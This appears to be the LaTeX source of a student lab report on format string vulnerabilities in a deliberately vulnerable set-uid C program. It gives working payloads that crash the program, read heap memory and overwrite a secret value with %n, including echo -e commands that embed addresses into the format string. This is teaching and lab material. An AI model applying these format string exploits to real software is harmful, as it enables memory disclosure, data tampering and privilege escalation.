% A technical part, describing what you did and how/why it works. Imagine that you are writing for another student who has not taken this unit: they should be able, after reading your technical part, to both reproduce your attacks by following the steps you give and to have a basic understanding of what is happening.

\subsection{Context}
In the C language, format strings provide a way of combining string literals with zero or more other types of data. The following is a subset of the format string substitutions that are important to this exercise:

\begin{minipage}{\linewidth}
\begin{lstlisting}[caption={Format string substitutions},
language=,
frame=single]
%d                  Signed integer
%s                  Null-terminated string
%x                  Signed integer in hexadecimal form
%p                  Address in hexadecimal form
%n                  Number of bytes printed up to this token
%<index>$<type>     Indexed substitution form
\end{lstlisting}
\end{minipage}

The \emph{\%n} token is special, because it writes to its corresponding parameter by treating it as a pointer. On the other hand, the indexed substitution form is useful either to refer to the same substitution variable multiple times, or to skip having to repeat the same token many times. For more details about the \emph{printf()} family of functions, the reader is referred to \cite{printf3}.

In this Lab we focus on the misuse of the \emph{printf()}, whereby a user-entered string is passed as the format string. Such mistake allows the user to control substitution tokens in ways that can violate the actual number of substitution variables supplied. This vulnerability was intentionally created in \emph{formatstring.c}:

\begin{minipage}{\linewidth}
\begin{lstlisting}[caption={Vulnerable part in formatstring.c},
label={lst:l1_pa_ex},
frame=single]
char user_input[100];
...
scanf("%s", user_input);
printf(user_input);
\end{lstlisting}
\end{minipage}

If the user enters a valid format string, it will be faithfully parsed by \emph{printf()} even though no substitution variables were supplied. This means that instead of  stopping when there are no more substitution variables to consume, \emph{printf()} continues accessing stack data until all tokens are respected.

In the following sections, we use \emph{formatstring.c} to demonstrate how the format string vulnerability can lead to leakage and overwrite of important data. The set-uid version of the \emph{formatstring} executable, \emph{formatstr-root}, is used. This document also comes with two Python scripts: \emph{cwk1\_p1.py}, and \emph{cwk1\_p2.py}, which automatically execute exploits documented herein.

\subsection{Task 1}
\subsubsection{Part (a) Crash the Program}
In order to consistently crash the program, we first inspect the stack so as to gather information that we might leverage. To understand how this was possible, the call stack structure is illustrated:

\begin{minipage}{\linewidth}
\begin{lstlisting}[caption={Stack frame illustration},
language=,
label={lst:l1_pa_stack},
frame=single]
...
main()  |    Local variables of main()
        |    Saved registers of main()
        |    Argument #N for printf()
        |    Argument... for printf()
        |    Argument #2 for printf()
        |    Argument #1 for printf()
        printf()    |    Return address to main()
                    |    Stack frame address of main()
                    |    Local variables of printf()
                    |    ...(stack grows downwards)
\end{lstlisting}
\end{minipage}

The stack structure in \lstref{lst:l1_pa_stack} suggests that reading past (above) the argument list would expose saved register values of the caller. We test this by running \emph{formatstr-root} and entering "\%x,\%x". Note that at this stage, the choice of the integer input does not matter. The execution results in two values being printed off the stack: \emph{bf978d88} and \emph{1}. The first value appears to be some address, while the second value seems to remain the same in every run. We then use the \emph{\%s} token to interpret the second value as an address, generating a segmentation fault (addresses near 0 are almost never accessible). The full payload is "\%2\$s", which translates into "treat the second argument as a char pointer, dereference it, and then display it".

\begin{minipage}{\linewidth}
\begin{lstlisting}[caption={De-referencing invalid address},
frame=single]
...
Please enter a string
%2$s
Segmentation fault (core dumped)
\end{lstlisting}
\end{minipage}

\subsubsection{Part (b) Print out the value of secret[1]}
Since the data pointed to by \emph{secret} is allocated on the heap, an indirection (i.e. de-referencing) is required for its access. The heap address itself thus needs to be written somewhere. This time, the integer input becomes useful.

We approach this attack by firstly locating the stack position or the \emph{argument index} of the integer input. This was achieved by entering arbitrarily many \emph{\%d} tokens with an easily identifiable integer input value. \lstref{lst:l1_pb_argind} shows that our integer input \emph{13371337} took the stack position of 9.

From now on, we can simply enter the address of secret[1] in decimal as the integer input, and then access it via \emph{"\%9\$.1s"}. This payload translates to: "treat the ninth argument as a char pointer, dereference it, and then display the first character". To read out the four byte value of \emph{secret[1]}, we send the payload four times (read one byte at a time), each time incrementing one byte from its base address. This process is shown in \lstref{lst:l1_pb_o1} and \lstref{lst:l1_pb_o2}. We chose to read the value of secret[1] byte-by-byte because the simple \emph{\%s} token has the danger of interpreting non null-terminated data that might overun readable address and cause a segmentation fault.

\begin{minipage}{\linewidth}
\begin{lstlisting}[caption={Locating integer input},
label={lst:l1_pb_argind},
language=,
frame=single]
...
Please enter a decimal integer
13371337
Please enter a string
%d,%d,%d,%d,%d,%d,%d,%d,%d,%d
-1075410664,1,-1218346231,-1075410625,-1075410626,0,-1075410396,
134914056,13371337,623666213
...
\end{lstlisting}
\end{minipage}

\begin{minipage}[t]{.48\textwidth}
\begin{lstlisting}[caption={Printing out secret{$[1]$} bytes 0 and 1},
label={lst:l1_pb_o1},
language=,
frame=single]
... address is 0x 8ffd00c
Please enter a decimal integer
150982668
Please enter a string
%9$.1s
U
...
... address is 0x 9ab700c
Please enter a decimal integer
150982668
Please enter a string
%9$.1s

...
\end{lstlisting}
\end{minipage}
\hfill
\begin{minipage}[t]{.48\textwidth}
\begin{lstlisting}[caption={Printing out secret{$[1]$} bytes 2 and 3},
label={lst:l1_pb_o2},
language=,
frame=single]
... address is 0x 8b8a00c
Please enter a decimal integer
146317326
Please enter a string
%9$.1s

...
... address is 0x 86ae00c
Please enter a decimal integer
141221904
Please enter a string
%9$.1s

...
\end{lstlisting}
\end{minipage}

The single character outputs from \lstref{lst:l1_pb_o1} and \lstref{lst:l1_pb_o2} are "\emph{U}", "\emph{(nothing)}", "\emph{(nothing)}", and "\emph{(nothing)}". By converting to ASCII codes and reversing the little-endian order, we arrive at \emph{0x55}, which matches the true value of secret[1].

\subsubsection{Part (c) Modify the value of secret[1]}
To modify secret[1], the \emph{\%n} token becomes crucial. Using the same integer input addressing method discussed in part (b), we construct the payload: "\%9\$n". This payload translates to: "treat the ninth argument as an integer address, dereference it, and then write zero into it". This payload sets secret[1] to zero because the payload itself led to no bytes being printed, and the ninth argument was set to the address of secret[1] by the integer input. \lstref{lst:l1_pc_o} illustrates the use of this payload.

\subsubsection{Part (d) Set secret[1] to a specific value}
Building on top of part (c), we gain the ability to set any pointed heap variable to almost any value with the payload "\%$<$val$>$.0s\$9n". The format syntax of this payload tells \emph{printf()} to produce $<$val$>$ number of white spaces, and then print zero characters from whichever string argument it is referencing to. The payload was used to set secret[1] to \emph{0x77} in \lstref{lst:l1_pd_o}.

\begin{minipage}{\linewidth}
\begin{lstlisting}[caption={Setting secret{$[1]$} to 0},
label={lst:l1_pc_o},
language=,
frame=single]
...
secret[1]'s address is 0x 9a6700c (on heap)
Please enter a decimal integer
161902604
Please enter a string
%9$n

The original secrets: 0x44 -- 0x55
The new secrets:      0x44 -- 0x0
\end{lstlisting}
\end{minipage}

\begin{minipage}{\linewidth}
\begin{lstlisting}[caption={Setting secret{$[1]$} to 0x77},
label={lst:l1_pd_o},
language=,
frame=single]
...
secret[1]'s address is 0x 996700c (on heap)
Please enter a decimal integer
160854028
Please enter a string
%119.0s%9$n

The original secrets: 0x44 -- 0x55
The new secrets:      0x44 -- 0x77
\end{lstlisting}
\end{minipage}

\subsection{Task 2: Remove Integer Input}
The removal of the integer input forbids setting the address using the integer input as practiced in Task 1. The \emph{user\_input} stack variable remains to be our only interaction with the program. While this does not affect the payload used to crash the program, parts (b), (c), and (d) require a new method of getting an address to secret[1].

Since the \emph{user\_input} char array is on the stack, it should be possible to access it via an indexed substitution token. In \lstref{lst:l1_t2_insp}, we inspect the stack again and find that \emph{user\_input} was the tenth argument ("RIPP" translates to 0x50504952 in hex). After locating the "scratch pad" argument, we convert the address of secret[1] to escaped bytes and embed them in the format string in little-endian order.

\lstref{lst:l1_t2_le_pb} demonstrates the delivery of escaped bytes through \emph{echo -e}. The payload prints out the first byte of the pointed address in ASCII. The result is the same as Task 1: 'U' (=\emph{0x55}); ther bytes are ommitted here since they are all null. This completes part (b). Finally, by using the same principle as the Task 1 part (d), we are able to wrtie an arbitrary value to the address of secret[1], effectively changing its value (\lstref{lst:l1_t2_le_pcd}).

\begin{minipage}{\linewidth}
\begin{lstlisting}[caption={Stack inspection to find the start of user\_input},
label={lst:l1_t2_insp},
language=,
frame=single]
...
Please enter a string
RIPPAAAA,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p
RIPPAAAA,0xbffff678,0x8,0xb7eb8309,0xbffff69f,0xbffff69e,
(nil),0xbffff784,0xbffff724,0x804b020,0x50504952,0x41414141,
0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c702
...
\end{lstlisting}
\end{minipage}

\begin{minipage}{\linewidth}
\begin{lstlisting}[caption={Little-endian conversion and reading one byte},
label={lst:l1_t2_le_pb},
language=,
frame=single]
echo -e '\x24\xb0\x04\x08<%10$.1s>' | ./formatstr-no-int-root
...
$<U>
The original secrets: 0x44 -- 0x55
The new secrets:      0x44 -- 0x55
\end{lstlisting}
\end{minipage}

\begin{minipage}{\linewidth}
\begin{lstlisting}[caption={Setting secret{$[1]$} to 0x77},
label={lst:l1_t2_le_pcd},
language=,
frame=single]
echo -e '\x24\xb0\x04\x08%119.0s%10$n' | ./formatstr-no-int-root
...
The original secrets: 0x44 -- 0x55
The new secrets:      0x44 -- 0x77
\end{lstlisting}
\end{minipage}

\subsection{Task 3: ASLR and Automation}
\subsubsection{Part (a) Redo Task 2 with ASLR turned on}
When address randomisation is turned on, we observe that bytes such as tab (\emph{0x09}) and spaces (\emph{0x20}), amongst a number of others, are now becoming part of the address of secret[1]. These bytes cause \emph{scanf()} to break the input, preventing the payloads from working for certain addresses.

To circumvent this, we need a new method of setting an arbitrary address that does not involve escaped bytes. One possibility is the "space-generator" payload, "\%$<$val$>$.0s", followed by a \emph{\%n}. Unfortunately, this took a long time as the terminal kept on printing spaces to the size of the target address (hundreds of millions). We have more ideas in mind but due to time constraints, these have not been implemented.

\subsubsection{Part (b) Automate Task 2 (b)}
As mentioned earlier, this document comes with two Python scrtips: \emph{cwk1\_p1.py} and \emph{cwk1\_p2.py}. Each of them automatically execute all of the exploits in Task 1 and Task 2 respectively. The code uses \emph{pexpect}, and parses the addresses printed by \emph{formatstring}.